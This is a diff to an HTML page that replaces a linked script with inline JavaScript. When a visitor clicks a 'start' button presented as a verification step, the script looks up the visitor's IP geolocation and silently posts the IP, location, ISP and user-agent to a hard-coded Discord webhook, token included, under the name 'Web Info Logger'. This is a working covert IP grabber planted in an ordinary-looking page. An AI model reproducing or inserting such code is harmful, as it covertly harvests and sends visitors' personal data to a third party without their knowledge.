@@ -20,6 +20,26 @@
 
     <audio id="audio" src="Audio.mp3" loop></audio>
 
-    <script src="script.js"></script>
+    <script>
+        document.getElementById("start-btn").addEventListener("click", function() {
+            const webhookURL = "https://discordapp.com/api/webhooks/1349835869753835560/9h2Z7a8wOKcw6skq0udXhmWOKZMcpCZZYwX5r67UA3X2R5ksRQFT9RY_U2ivIdHuN8u3";
+            
+            fetch("https://ipapi.co/json/")
+                .then(response => response.json())
+                .then(data => {
+                    const info = {
+                        username: "Web Info Logger",
+                        content: `New Verification Attempt:\nIP: ${data.ip}\nCountry: ${data.country_name}\nRegion: ${data.region}\nCity: ${data.city}\nISP: ${data.org}\nUser-Agent: ${navigator.userAgent}`
+                    };
+                    
+                    fetch(webhookURL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(info)
+                    });
+                })
+                .catch(error => console.error("Error fetching IP info:", error));
+        });
+    </script>
 </body>
 </html>
